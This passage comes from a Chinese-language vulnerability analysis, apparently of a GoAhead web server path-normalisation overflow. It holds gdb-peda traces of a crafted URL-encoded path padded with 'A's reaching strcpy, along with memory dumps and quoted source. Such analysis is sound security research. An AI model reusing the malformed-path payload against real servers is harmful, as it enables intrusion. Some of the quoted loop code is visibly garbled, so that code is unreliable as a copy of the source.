    EBP: 0x805d8ac ("/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ...)
    ESP: 0xbffff25c --> 0xb7fb8a9c (:      add    esp,0x30)
    EIP: 0xb7fb61be (:          ret)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0xb7fb61bb :   pop    esi
       0xb7fb61bc :   pop    edi
       0xb7fb61bd :   pop    ebp
    => 0xb7fb61be :    ret    
       0xb7fb61bf :    nop
       0xb7fb61c0 :   lea    eax,[ebp+0x7]
       0xb7fb61c3 :   mov    BYTE PTR [ebp+0x4],0x0
       0xb7fb61c7 :   mov    edx,DWORD PTR [esp+0xc]
    [------------------------------------stack-------------------------------------]
    0000| 0xbffff25c --> 0xb7fb8a9c (:  add    esp,0x30)
    0004| 0xbffff260 --> 0x805d8ac ("/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ...)
    0008| 0xbffff264 --> 0xbffff2c0 --> 0x805bcc0 --> 0x805792f --> 0x0 
    0012| 0xbffff268 --> 0x0 
    0016| 0xbffff26c --> 0xbffff2ac --> 0xb7fc94e1 ("localhost")
    0020| 0xbffff270 --> 0xbffff2b8 --> 0x805c70e --> 0x0 
    0024| 0xbffff274 --> 0xbffff2b4 --> 0x805bcc0 --> 0x805792f --> 0x0 
    0028| 0xbffff278 --> 0xbffff2bc --> 0x805c1e4 --> 0x782e ('.x')
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Breakpoint 2, 0xb7fb61be in websUrlParse (
        url=0x805d8ac "/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ..., pbuf=0xbffff2c0, pprotocol=0x0, phost=0xbffff2ac, 
        pport=0xbffff2b8, ppath=0xbffff2b4, pext=0xbffff2bc, preference=0x0, 
        pquery=0xbffff2b0) at src/http.c:3162
    3162         }
    gdb-peda$ x/10x *0xbffff2b4
    0x805bcc0:       0x0805792f      0x0805792f      0xbffff298         0x0805793f
    0x805bcd0:      0x41414141     0x41414141     0x41414141     0x41414141
    0x805bce0:      0x41414141     0x41414141
    ```
可以看到，此时已经覆盖上畸形变量了，bffff2b4存放的是path地址，接下来返回后，path会继续传入到漏洞函数中。
    ```
    gdb-peda$ 
    [-------------------------------------code-------------------------------------]
       0xb7fb8aa1 :      js     0xb7fb8cca 
       0xb7fb8aa7 :      sub    esp,0xc
       0xb7fb8aaa :      push   DWORD PTR [esp+0x30]
    => 0xb7fb8aae :        call   0xb7fad160 
       0xb7fb8ab3 :      mov    edi,DWORD PTR [esp+0xc0]
       0xb7fb8aba :      add    esp,0x10
       0xb7fb8abd :      test   eax,eax
       0xb7fb8abf :       mov    DWORD PTR [edi+0x16c],eax
    Guessed arguments:
    arg[0]: 0x805bcc0 --> 0x805792f --> 0x0 
    [------------------------------------stack-------------------------------------]
    0000| 0xbffff280 --> 0x805bcc0 --> 0x805792f --> 0x0 
    0004| 0xbffff284 --> 0xb7fdb948 --> 0xb7fa8000 --> 0x464c457f 
    0008| 0xbffff288 --> 0xb7fc03c5 (:      add    ecx,0x180bb)
    0012| 0xbffff28c --> 0xb7fb8a40 (:  cmp    eax,0x2)
    0016| 0xbffff290 --> 0xbffff2f0 --> 0xb7faa608 --> 0x675f5f00 ('')
    0020| 0xbffff294 --> 0xb7eec450 --> 0x80618a8 --> 0x0 
    0024| 0xbffff298 --> 0x10 
    0028| 0xbffff29c --> 0x2008 
    gdb-peda$ x/10x 0x0805bcc0
    0x805bcc0:       0x0805792f      0x0805792f      0xbffff298         0x0805793f
    0x805bcd0:      0x41414141     0x41414141     0x41414141     0x41414141
    0x805bce0:      0x41414141     0x41414141
    ```
接下来，进入到漏洞函数开始分析漏洞的成因。首先根据源码，找到了一处strcpy函数。
    ```
        if ((dupPath = walloc(len + 2)) == 0) {
            return NULL;
        }
        strcpy(dupPath, pathArg);
    ```
这里会将畸形字符串考入dupPath中。
    ```
    gdb-peda$ x/10x 0x0805bcc0
    0x805bcc0:       0x0805792f      0x0805792f      0xbffff298         0x0805793f
    0x805bcd0:      0x41414141     0x41414141     0x41414141     0x41414141
    0x805bce0:      0x41414141     0x41414141
    [-------------------------------------code-------------------------------------]
       0xb7fb6445 :       
        jmp    0xb7fb6432 
       0xb7fb6447:       mov    esi,esi
       0xb7fb6449:       lea    edi,[edi+eiz*1+0x0]
    => 0xb7fb6450 :      push   ebp
       0xb7fb6451 :         push   edi
       0xb7fb6452 :         push   esi
       0xb7fb6453 :         push   ebx
       0xb7fb6454 :         
        call   0xb7fae4a0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Breakpoint 4, websNormalizeUriPath (
        pathArg=0x805bcc0 "/y05b/y05b230362377277?y05b", 'A' ...) at src/http.c:3170
    3170         {
    gdb-peda$ x/10x 0x0805bcc0
    0x805bcc0:       0x0805792f      0x0805792f      0xbffff298         0x0805793f
    0x805bcd0:      0x41414141     0x41414141     0x41414141     0x41414141
    0x805bce0:      0x41414141     0x41414141
    gdb-peda$ 
        strcpy(dupPath, pathArg);
    [-------------------------------------code-------------------------------------]
       0xb7fb64a8 :       push   esi
       0xb7fb64a9 :       mov    esi,DWORD PTR [esp+0x20]
       0xb7fb64ad :       push   esi
    => 0xb7fb64ae :        call   0xb7fad8c0 
       0xb7fb64b3 :       lea    eax,[edi*4+0x4]
       0xb7fb64ba :    mov    DWORD PTR [esp],eax
       0xb7fb64bd :    call   0xb7fad9b0 
       0xb7fb64c2 :     add    esp,0x10
    gdb-peda$ x/10x $esp
    0xbffff230:        0x0805c720     0x0805bcc0      0x00000000     0x0805c1e6
    0xbffff240:        0x0805d8ac     0xb7faa388      0xb7fb5fd9       0xb7fd8480
    0xbffff250:        0x0805ddd3     0x0805c720
    gdb-peda$ x/10x 0x0805bcc0
    0x805bcc0:       0x0805792f      0x0805792f      0xbffff298         0x0805793f
    0x805bcd0:      0x41414141     0x41414141     0x41414141     0x41414141
    0x805bce0:      0x41414141     0x41414141
    ```
接下来会进入两处for循环，会对路径进行一些处理，比如将/./合并等等，在第二处for循环中，由于输入和输出长度变量没有对称，导致拷贝中可以构成一个超长字符串，下面动态来观察这一过程。
    ```
       for (mark = sp = dupPath; *sp; sp++) {
            if (*sp == '/') {
                *sp = '';
                while (sp[1] == '/') {
                    sp++;
                }
                segments[nseg++] = mark;
                len += (int) (sp - mark);
                mark = sp + 1;
            }
        }
        segments[nseg++] = mark;
        len += (int) (sp - mark);
        for (j = i = 0; i = 0) {
                            segments[j] = "";
                        }
                    } else {
                        j = max(j - 2, -1);
                    }
                }
            } else {
                segments[j] = segments[i];
            }
        }
    ```
上述代码就是我描述的过程，执行完处理后，看一下dp的长度。